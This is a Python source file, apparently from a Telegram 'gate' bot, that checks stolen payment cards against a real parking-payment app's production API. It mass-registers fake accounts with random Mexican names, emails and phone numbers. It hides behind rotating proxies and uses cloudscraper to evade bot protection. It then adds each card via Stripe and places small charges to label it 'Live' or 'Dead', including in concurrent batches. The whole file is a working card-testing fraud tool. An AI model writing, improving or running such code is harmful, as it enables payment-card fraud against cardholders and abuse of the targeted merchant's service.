"""Core de gates con generación dinámica de cuentas y limpieza de cloudscraper."""
from __future__ import annotations

import asyncio
import json
import logging
import random
import string
import time
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

import cloudscraper
import requests

from bot.config import gate_proxy

logger = logging.getLogger(__name__)


# Qué pool de proxies usa cada gate. "mx" = proxies sticky MX;
# "rot" = proxies rotatorios/USA. Todo el flujo de un gate usa el mismo pool.
GATE_PROXY_POOL = {
    "Euridice": "mx",
    "Philotes": "mx",
    "Eurinias": "mx",
    "Wojtek": "mx",
}


def _pick_proxy(pool: str = "mx") -> Optional[dict]:
    """Estrena un proxy sticky (con lifetime) del pool indicado.

    Cada flujo usa un solo proxy de principio a fin: en los masivos se pide
    una vez y se comparte entre todas las tarjetas del lote.
    """
    proxy_url = gate_proxy(pool)
    if not proxy_url:
        return None
    return {"http": proxy_url, "https": proxy_url}


# ---------------------------------------------------------------------------
# Configuración de la API objetivo
# ---------------------------------------------------------------------------
API_BASE = "https://parkingpay-api-prod.azurewebsites.net"
REGISTER_URL = f"{API_BASE}/api/app/usuarios/registro"
LOGIN_URL = f"{API_BASE}/api/auth"
TARJETAS_URL = f"{API_BASE}/api/app/conductor/tarjetas"
CONDUCTOR_URL = f"{API_BASE}/api/app/conductor"
ABONO_URL = f"{API_BASE}/api/app/conductor/pagos/abono"

MONTOS = {
    "Euridice": 100.0,
    "Philotes": 1.0,
    "Eurinias": 20.0,
    "Wojtek": 50.0,
}

# ---------------------------------------------------------------------------
# Datos para generación dinámica de cuentas
# ---------------------------------------------------------------------------
_NOMBRES = [
    "Juan", "Pedro", "Luis", "Carlos", "Miguel", "Jose", "Francisco",
    "Antonio", "Alejandro", "Javier", "Ricardo", "Fernando", "Roberto",
    "Sergio", "Arturo", "Maria", "Ana", "Laura", "Carmen", "Rosa",
    "Guadalupe", "Martha", "Patricia", "Gabriela", "Alejandra",
    "Adriana", "Monica", "Veronica", "Claudia", "Sandra",
]
_APELLIDOS = [
    "Garcia", "Lopez", "Martinez", "Rodriguez", "Hernandez", "Gonzalez",
    "Perez", "Sanchez", "Ramirez", "Cruz", "Flores", "Morales",
    "Vazquez", "Jimenez", "Torres", "Reyes", "Castillo", "Ortiz",
    "Mendoza", "Ruiz",
]
_DOMINIOS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "proton.me"]

# ---------------------------------------------------------------------------
# Control de concurrencia
# ---------------------------------------------------------------------------
_global_semaphore = asyncio.Semaphore(15)
_user_semaphores: Dict[int, asyncio.Semaphore] = defaultdict(lambda: asyncio.Semaphore(3))

_active_requests_count = 0
_user_request_count: Dict[int, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Utilidades de generación de datos
# ---------------------------------------------------------------------------
def _random_string(n: int = 10) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _random_phone() -> str:
    lada = random.choice(["332", "555", "810", "449", "222", "477", "686", "664", "612", "667"])
    return lada + "".join(random.choices("0123456789", k=7))


def _random_email() -> str:
    timestamp = int(time.time() * 1000) % 100000
    return f"{_random_string(6)}{timestamp}@{random.choice(_DOMINIOS)}"


def _random_password() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))


# ---------------------------------------------------------------------------
# Gate apagado: mensaje simple (sin horarios) + regla nocturna
# ---------------------------------------------------------------------------
try:
    from zoneinfo import ZoneInfo
    _MX_TZ = ZoneInfo("America/Mexico_City")
except Exception:
    _MX_TZ = None

# Después de las 8:20pm (hora México) un error es casi seguro gate apagado.
_HORA_CORTE_NOCTURNO = (20, 20)


class _ApiApagada(Exception):
    """El API del comercio está apagado (Azure detenido)."""


def _es_pagina_apagada(status_code: int, texto: str) -> bool:
    """Detecta la página de Azure cuando la web app está detenida."""
    if status_code != 403:
        return False
    t = (texto or "").lower()
    return "unavailable" in t or "stopped" in t or "web app" in t


def _es_noche_apagado(ahora=None) -> bool:
    """True si en México ya pasó la hora de corte nocturno."""
    try:
        ahora = ahora or (datetime.now(_MX_TZ) if _MX_TZ else datetime.now())
    except Exception:
        ahora = ahora or datetime.now()
    return (ahora.hour, ahora.minute) >= _HORA_CORTE_NOCTURNO


def _mensaje_apagado(gate_name: str) -> Dict[str, str]:
    return {
        "status": "🔌 Apagado",
        "message": f"Gate {gate_name} apagado.",
    }


# ---------------------------------------------------------------------------
# Fallback: token estático desde archivo
# ---------------------------------------------------------------------------
def _leer_token_estatico() -> Optional[str]:
    try:
        archivo = Path("data/txt/token1.txt")
        if not archivo.exists():
            return None
        lineas = [linea.strip() for linea in archivo.read_text(encoding="utf-8").splitlines() if linea.strip()]
        return random.choice(lineas) if lineas else None
    except Exception as exc:
        logger.debug("Error leyendo token estático: %s", exc)
        return None


# ---------------------------------------------------------------------------
# Registro dinámico de cuenta
# ---------------------------------------------------------------------------
def _register_account(proxies: Optional[dict] = None) -> Optional[str]:
    """Registra una cuenta nueva en la API y devuelve su token JWT.

    Esta función es bloqueante; debe llamarse vía asyncio.to_thread.
    Se encarga de crear y cerrar su propio scraper para no dejar hilos
    ni conexiones huérfanos.

    Si se pasa `proxies`, se reutiliza el mismo para todo el flujo y no
    se cambia de proxy entre etapas.
    """
    scraper = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "ios", "mobile": True},
        delay=2,
    )
    if proxies is None:
        proxies = _pick_proxy()
    if proxies:
        scraper.proxies = proxies
    try:
        headers = {
            "user-agent": "Dart/2.18 (dart:io)",
            "content-type": "application/json; charset=utf-8",
        }
        nombre = random.choice(_NOMBRES)
        apellido = random.choice(_APELLIDOS)
        email = _random_email()
        password = _random_password()
        telefono = _random_phone()

        datos = {
            "Nombre": nombre,
            "Apellidos": apellido,
            "Telefono": telefono,
            "CorreoElectronico": email,
            "Contrasena": password,
            "ConfirmarContrasena": password,
        }

        r = scraper.post(REGISTER_URL, json=datos, headers=headers, timeout=15)
        if _es_pagina_apagada(r.status_code, r.text):
            raise _ApiApagada()
        if r.status_code not in (200, 201):
            logger.debug("Registro falló: HTTP %s - %s", r.status_code, r.text[:120])
            return None

        login_data = {"CorreoElectronico": email, "Contrasena": password}
        r2 = scraper.post(LOGIN_URL, json=login_data, headers=headers, timeout=15)
        if r2.status_code in (200, 201):
            data = r2.json()
            token = data.get("token")
            if token:
                return token
        logger.debug("Login falló: HTTP %s - %s", r2.status_code, r2.text[:120])
        return None
    except Exception as exc:
        logger.debug("Error en registro dinámico: %s", exc)
        return None
    finally:
        try:
            scraper.close()
        except Exception:
            pass


def _obtener_token(proxies: Optional[dict] = None) -> Optional[str]:
    """Intenta obtener token dinámico; si falla, usa el estático."""
    token = _register_account(proxies=proxies)
    if token:
        return token
    return _leer_token_estatico()


# ---------------------------------------------------------------------------
# Validación de tarjeta
# ---------------------------------------------------------------------------
def procesar_y_validar(card_data: str) -> Optional[Tuple[str, str, str, str]]:
    try:
        parts = card_data.split("|")
        if len(parts) != 4:
            return None

        cc_number, mes, ano, cvv = parts

        if not cc_number.isdigit() or len(cc_number) < 13 or len(cc_number) > 19:
            return None

        try:
            mes_int = int(mes)
            if mes_int < 1 or mes_int > 12:
                return None
        except ValueError:
            return None

        try:
            ano_int = int(ano)
            if len(ano) == 4:
                if ano_int < 2000 or ano_int > 2099:
                    return None
                ano_2_digits = str(ano_int)[-2:]
            elif len(ano) == 2:
                if ano_int < 0 or ano_int > 99:
                    return None
                ano_2_digits = ano
            else:
                return None
        except ValueError:
            return None

        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return None

        return cc_number, mes, ano_2_digits, cvv
    except Exception as exc:
        logger.debug("Error validando tarjeta: %s", exc)
        return None


# ---------------------------------------------------------------------------
# Petición al gate con limpieza estricta de cloudscraper
# ---------------------------------------------------------------------------
async def _make_gate_request_inner(
    gate_name: str,
    card_data: str,
    user_id: int,
    shared_proxies: Optional[dict] = None,
) -> Dict[str, str]:
    global _active_requests_count
    _active_requests_count += 1
    scraper: Optional[cloudscraper.CloudScraper] = None

    try:
        resultado = procesar_y_validar(card_data)
        if resultado is None:
            return {"status": "❌ Dead", "message": "Fechas Invalidas"}

        cc_number, mes, ano, cvv = resultado

        # Si no nos pasaron proxy, elegimos uno del pool correspondiente a este gate.
        proxies = shared_proxies or _pick_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))

        try:
            token = await asyncio.to_thread(_obtener_token, proxies)
        except _ApiApagada:
            return _mensaje_apagado(gate_name)
        if not token:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "No hay tokens disponibles"}

        scraper = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "ios", "mobile": True},
            delay=2,
        )
        if proxies:
            scraper.proxies = proxies

        inicio = datetime.now()
        headers = {
            "user-agent": "Dart/2.18 (dart:io)",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "authorization": token,
            "host": "parkingpay-api-prod.azurewebsites.net",
        }

        # Paso 1: Añadir tarjeta
        response = await asyncio.to_thread(
            scraper.post,
            url=TARJETAS_URL,
            data=f'{{"numero":"{cc_number}","expiracionMes":"{mes}","expiracionYear":"20{ano}"}}',
            headers=headers,
            timeout=20,
        )

        await asyncio.sleep(5)

        if "This web app is stopped" in response.text or response.status_code == 403:
            return _mensaje_apagado(gate_name)

        if response.status_code == 400 or "Ocurrió un error al crear la tarjeta en stripe" in response.text:
            tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
            return {"status": "❌ Dead", "message": f"Dead - {tiempo} segundos"}

        try:
            stripe_card_id = json.loads(response.text)["stripeCardId"]
        except (KeyError, json.JSONDecodeError):
            tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
            return {"status": "❌ Dead", "message": f"No se pudo obtener stripeCardId - {tiempo} segundos"}

        await asyncio.sleep(3)

        # Paso 2: Obtener tarjetaId
        response = await asyncio.to_thread(
            scraper.get,
            url=CONDUCTOR_URL,
            headers={
                **headers,
                "content-type": "application/json",
            },
            timeout=20,
        )

        tarjeta_id = None
        try:
            for tarjeta in json.loads(response.text)["cartera"]["tarjetas"]:
                if tarjeta["stripeInfo"]["stripeCardId"] == stripe_card_id:
                    tarjeta_id = tarjeta["tarjetaId"]
                    break
        except (KeyError, TypeError, json.JSONDecodeError):
            pass

        await asyncio.sleep(5)

        if not tarjeta_id:
            tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
            return {"status": "❌ Dead", "message": f"No se encontró tarjetaId - {tiempo} segundos"}

        monto = MONTOS.get(gate_name, 100.0)

        # Philotes solo asocia la tarjeta; no hace cargo
        if gate_name == "Philotes":
            tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
            return {"status": "✅ Live", "message": f"Charger {monto} Mnx - {tiempo} segundos"}

        # Paso 3: Realizar cargo
        response = await asyncio.to_thread(
            scraper.post,
            url=ABONO_URL,
            data=f'{{"tarjetaId":"{tarjeta_id}","porAbonar":{monto}}}',
            headers=headers,
            timeout=20,
        )

        tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"

        if "stripeCardId" in response.text or response.status_code == 200:
            return {"status": "✅ Live", "message": f"Charger {monto} Mnx - {tiempo} segundos"}

        return {"status": "❌ Dead", "message": "Tarjeta delinada"}

    except _ApiApagada:
        return _mensaje_apagado(gate_name)
    except requests.exceptions.RequestException as exc:
        logger.debug("Error de red en gate %s: %s", gate_name, exc)
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error de conexión con el gate"}
    except Exception as exc:
        logger.exception("Error REAL en gate %s (oculto al usuario): %s", gate_name, exc)
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error avisar a un administrador"}
    finally:
        _active_requests_count -= 1
        if scraper is not None:
            try:
                scraper.close()
            except Exception:
                pass
            # Liberar explícitamente el adaptador de conexiones para evitar
            # fugas de hilos/pools de urllib3 entre peticiones.
            try:
                scraper.mount("https://", requests.adapters.HTTPAdapter())
                scraper.mount("http://", requests.adapters.HTTPAdapter())
            except Exception:
                pass


# ---------------------------------------------------------------------------
# API pública
# ---------------------------------------------------------------------------
async def _make_gate_request(
    gate_name: str,
    card_data: str,
    user_id: int,
    shared_proxies: Optional[dict] = None,
) -> Dict[str, str]:
    """Envuelve el flujo del gate aplicando la regla nocturna.

    Los veredictos (Live/Dead) se respetan siempre: si hubo veredicto,
    el gate está encendido. Pero un error después de las 8:20pm
    (hora México) es casi seguro gate apagado y se reporta como tal.
    """
    result = await _make_gate_request_inner(gate_name, card_data, user_id, shared_proxies)
    if result.get("status") == "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error" and _es_noche_apagado():
        return _mensaje_apagado(gate_name)
    return result


async def gate_check(gate_name: str, card_data: str, user_id: Optional[int] = None) -> Dict[str, str]:
    uid = user_id if user_id is not None else 0
    _user_request_count[uid] += 1
    try:
        async with _global_semaphore:
            async with _user_semaphores[uid]:
                logger.debug(
                    "Usuario %s - Iniciando %s para %sxxxx",
                    uid, gate_name, card_data[:6],
                )
                await asyncio.sleep(0.1 + (uid % 5) * 0.05)
                return await _make_gate_request(gate_name, card_data, uid)
    finally:
        _user_request_count[uid] -= 1


async def gate_check_multiple(
    gate_name: str,
    cards_data: List[str],
    user_id: Optional[int] = None,
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
) -> List[Dict[str, str]]:
    uid = user_id if user_id is not None else 0
    cards_clean = [card.strip() for card in cards_data if card.strip()]
    total = len(cards_clean)

    if total == 0:
        return []

    # Un solo proxy para TODO el lote masivo. Así no se queman 10 proxies por usuario.
    shared_proxies = _pick_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))

    results: List[Optional[Dict[str, str]]] = [None] * total
    result_queue: asyncio.Queue[Tuple[int, Dict[str, str]]] = asyncio.Queue()

    async def process_single_card(index: int, card_data: str) -> Dict[str, str]:
        max_retries = 3
        retry = 0
        while retry < max_retries:
            try:
                async with _global_semaphore:
                    async with _user_semaphores[uid]:
                        await asyncio.sleep(0.1 + (index % 5) * 0.05)
                        result = await _make_gate_request(gate_name, card_data, uid, shared_proxies)
                        await result_queue.put((index, result))
                        return result
            except Exception as exc:
                logger.debug("Reintento %s/%s fallido para tarjeta %s: %s", retry + 1, max_retries, index + 1, exc)
                retry += 1
                if retry < max_retries:
                    await asyncio.sleep(3)

        error_result = {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error al procesar tarjeta tras reintentos"}
        await result_queue.put((index, error_result))
        return error_result

    async def process_results() -> None:
        processed = 0
        while processed < total:
            try:
                index, result = await asyncio.wait_for(result_queue.get(), timeout=2.0)
            except asyncio.TimeoutError:
                if all(task.done() for task in tasks):
                    while not result_queue.empty():
                        try:
                            index, result = result_queue.get_nowait()
                            if results[index] is None:
                                results[index] = result
                                processed += 1
                                if callback:
                                    await callback(index, result, cards_clean[index], uid)
                        except asyncio.QueueEmpty:
                            break
                    for i in range(total):
                        if results[i] is None:
                            results[i] = {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Tarjeta no procesada (timeout interno)"}
                            processed += 1
                    break
                continue

            if results[index] is None:
                results[index] = result
                processed += 1
                if callback:
                    try:
                        await callback(index, result, cards_clean[index], uid)
                    except Exception as cb_err:
                        logger.debug("Error en callback tarjeta %s: %s", index + 1, cb_err)

    tasks = [asyncio.create_task(process_single_card(i, card)) for i, card in enumerate(cards_clean)]
    processor = asyncio.create_task(process_results())

    await asyncio.gather(*tasks, return_exceptions=True)
    for task in tasks:
        if not task.done():
            task.cancel()

    await processor
    return [r if r is not None else {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Sin resultado"} for r in results]
